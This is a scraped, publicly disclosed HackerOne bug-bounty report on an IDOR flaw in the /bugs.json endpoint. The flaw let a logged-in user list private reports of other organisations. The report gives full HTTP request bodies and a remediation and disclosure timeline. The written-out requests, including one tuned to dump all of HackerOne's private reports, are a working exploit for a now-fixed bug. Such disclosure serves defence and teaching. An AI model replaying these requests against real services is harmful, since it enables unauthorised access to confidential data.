---
title: "Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint"
author: bate5a
url: https://hackerone.com/reports/2487889
date_published: 2024-05-02
date_scraped: 2026-11-16
platform: hackerone
disclosed_report: https://hackerone.com/reports/2487889
bounty: not stated (awarded; $500 retest award)
vuln_class: idor
---

<!-- Raw scraped text below. Public, non-paywalled content only.
     This file is source material, never copied into skills verbatim. -->

# Insecure Direct Object Reference (IDOR) Allows Viewing Private Report Details via /bugs.json Endpoint

Reported to: HackerOne | Reporter: bate5a | Reported: 2024-05-02 | Disclosed: 2024-05-23 | State: Resolved | Severity: critical

## Report body

### Hi H1 i hope you are Doing Well Today :)



### Explaining

* I Found that any private reports can be accessed by sending a POST request to the `/bugs.json` endpoint. This vulnerable endpoint requires `organization_id`, which takes the organization's ID as a value. It also requires `text_query`, which is used to search for report IDs. within this  org  , Now you can append the example organization ID mentioned on the policy page, `58579`. and For the `text_query`, you can simply append a single digit, such as 1, or any other single number. This will query all reports containing this digit, provided they belong to the specified organization



### Step To Reproduce 

1.Send a POST request to this endpoint. You can change the organization_id to anything, but leave it as it is 

```

POST /bugs.json HTTP/2
Host: hackerone.com
Cookie:  __Host-session=Your-Session-Here
X-Csrf-Token: Your-Csrf-Here
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Te: trailers
Content-Length: 390

text_query=1&organization_id=58579&persist=true&sort_type=pg_search_rank&view=message&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=triaged&substates%5B%5D=resolved&substates%5B%5D=informative&substates%5B%5D=not-applicable&substates%5B%5D=duplicate&substates%5B%5D=retesting&substates%5B%5D=pending-program-review&substates%5B%5D=spam&duplicates_must_have_no_ref=true

```




### Poc Video

█████████

## Impact

idor lead to view private reports `title`,`url`,`id`,`state`,`substate`,`severity_rating`,`readable_substate`,`created_at`,`submitted_at`,`reporter_name`

## Impact (as written)

idor lead to view private reports `title`,`url`,`id`,`state`,`substate`,`severity_rating`,`readable_substate`,`created_at`,`submitted_at`,`reporter_name`

## Timeline

- 2024-05-02 21:18 UTC: bate5a submitted the report to HackerOne.
- Reporter update (comment, edited 2024-05-08), addressed to h1_analyst_oscar: parameters `limit=1000` and `page=1` can be added so no `text_query` guessing is needed; this would disclose all private reports in org `13` (HackerOne's own). `substates[]=editing` additionally discloses drafted reports. Note: "this bug can be exploited in private organizations as well, not just public ones, which would disclose program handler, about, etc..."

Request block 2:

```
POST /bugs.json HTTP/2
Host: hackerone.com
Cookie: Your-Cookies
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://hackerone.com/bugs?subject=user
X-Csrf-Token: Csrf-Token
X-Requested-With: XMLHttpRequest
Content-Type: application/x-www-form-urlencoded
Content-Length: 457

text_query=&organization_id=13&view=open&substates%5B%5D=new&substates%5B%5D=needs-more-info&substates%5B%5D=pending-program-review&substates%5B%5D=triaged&substates%5B%5D=pre-submission&substates%5B%5D=retesting&substates%5B%5D=not-applicable&substates%5B%5D=editing&substates%5B%5D=informative&program_states%5B%5D=2&program_states%5B%5D=3&program_states%5B%5D=4&program_states%5B%5D=5&sort_type=latest_activity&sort_direction=descending&limit=1000&page=1
```

- 2024-05-08 05:19 UTC: h1_analyst_oscar (HackerOne triage) updated severity from critical (9.5) to critical (9.3); status to Pending program review; message: validated and submitted to remediation team.
- 2024-05-08: bencode (HackerOne staff) changed status to Triaged: "we have validated the finding."
- 2024-05-08: z0x01 (HackerOne staff): "We addressed this bug. Could you please verify if you can reproduce this behavior?" Scope changed from www.hackerone.com to hackerone.com. Title changed from "IDOR Lead to view Private Reports Details Via /bugs.json Endpoint" to the current title.
- 2024-05-08, bate5a: fixed, now gets an empty response (screenshot redacted).
- 2024-05-08, z0x01: forensic investigation ongoing. 2024-05-13: provided new information about severity. HackerOne rewarded a bounty (amount hidden), said payout decided during the forensic investigation, long-term solution pending.
- 2024-05-13, bate5a asks about swag; z0x01: swag process not operational.
- 2024-05-14, z0x01: status Retesting; reporter invited to retest for $500; "We have implemented our long-term solution."
- Retest by bate5a: "No, the fix works." When replacing own organization ID with another organization ID, received an empty response. HackerOne awarded $500 for the retest (2024-05-15). z0x01 closed as Resolved 2024-05-15.
- 2024-05-15, z0x01: still working on the incident triggered by this report, must complete before disclosure.
- 2024-05-22, cevans_0glc8 (HackerOne): "thank you for testing this bug carefully and responsibly. Once you realized that the bug could allow cross-organizational leakage, you stopped immediately and reported it." Also notes HackerOne discloses significant reports.
- 2024-05-22: bate5a requested disclosure but asked to redact videos and images; z0x01 redacted the report and made all videos/images internal; bate5a confirmed.
- 2024-05-23 20:24 UTC: report disclosed.

## Metadata (from report sidebar)

Reported to: HackerOne (security). Severity: Critical (9.3), CVSS vector AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N (from API). Weakness: IDOR. State: Resolved. CVE: none. Bounty amount hidden on page; retest award $500 stated in timeline.
